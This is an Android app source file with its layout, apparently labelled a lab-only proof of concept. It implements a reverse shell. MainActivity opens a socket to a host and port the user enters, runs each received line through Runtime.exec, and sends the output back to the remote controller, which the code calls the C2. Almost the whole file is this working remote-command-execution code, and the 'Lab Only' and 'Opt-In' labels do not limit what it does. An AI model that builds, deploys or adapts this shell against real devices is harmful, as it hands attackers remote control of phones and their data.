// MainActivity.java
package com.example.reverseshellpoc;

import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;

public class MainActivity extends AppCompatActivity {

    private EditText ipAddressInput, portInput;
    private Button connectButton;
    private TextView statusText;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        ipAddressInput = findViewById(R.id.ipAddressInput);
        portInput = findViewById(R.id.portInput);
        connectButton = findViewById(R.id.connectButton);
        statusText = findViewById(R.id.statusText);

        // Labeling the app clearly for its purpose
        setTitle("PoC Reverse Shell (Lab Only)");

        connectButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                statusText.setText("Status: Attempting to connect...");
                // The connection logic must run on a separate thread to avoid blocking the UI.
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        startReverseShell();
                    }
                }).start();
            }
        });
    }

    private void startReverseShell() {
        String ipAddress = ipAddressInput.getText().toString();
        int port = Integer.parseInt(portInput.getText().toString());

        try (Socket socket = new Socket(ipAddress, port)) {
            runOnUiThread(() -> statusText.setText("Status: Connected to " + ipAddress));

            PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));

            // Send an initial greeting to the server
            writer.println("Android device connected.");

            String command;
            while ((command = reader.readLine()) != null) {
                try {
                    // Execute the received command
                    Process process = Runtime.getRuntime().exec(command);

                    // Reader for the process's standard output stream
                    BufferedReader processReader = new BufferedReader(new InputStreamReader(process.getInputStream()));

                    // Reader for the process's error stream
                    BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));

                    // Use a StringBuilder to capture all output
                    StringBuilder output = new StringBuilder();
                    String line;

                    // Read the standard output
                    while ((line = processReader.readLine()) != null) {
                        output.append(line).append("\n");
                    }

                    // Read the standard error
                    while ((line = errorReader.readLine()) != null) {
                        output.append("ERROR: ").append(line).append("\n");
                    }

                    // Wait for the process to complete to ensure it's not hanging
                    process.waitFor();

                    // Send the command output back to the server
                    // If there was no output, send a confirmation message instead.
                    if (output.length() == 0) {
                        writer.println("Command executed with no output.");
                    } else {
                        writer.println(output.toString());
                    }
                    writer.println("END_OF_COMMAND"); // Delimiter to signal the end of output

                } catch (Exception e) {
                    // If command execution fails, send the error back to the C2
                    writer.println("Error executing command: " + e.getMessage());
                    writer.println("END_OF_COMMAND");
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
            runOnUiThread(() -> statusText.setText("Status: Connection failed or lost. Error: " + e.getMessage()));
        }
    }
}
/*
Layout file: res/layout/activity_main.xml
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:padding="16dp"
    android:gravity="center"
    tools:context=".MainActivity">

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="C2 Server (Lab Only)"
        android:textSize="18sp"
        android:layout_marginBottom="16dp"/>

    <EditText
        android:id="@+id/ipAddressInput"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:hint="Enter Server IP Address"
        android:inputType="text"
        android.text="10.0.2.2" /> <!-- Default for Android Emulator -->

    <EditText
        android:id="@+id/portInput"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:hint="Enter Server Port"
        android:inputType="number"
        android:text="4444" />

    <Button
        android:id="@+id/connectButton"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_marginTop="16dp"
        android:text="Connect (Opt-In)" />

    <TextView
        android:id="@+id/statusText"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_marginTop="24dp"
        android:text="Status: Idle"
        android:textSize="16sp" />

</LinearLayout>

AndroidManifest.xml requires:
<uses-permission android:name="android.permission.INTERNET" />
*/
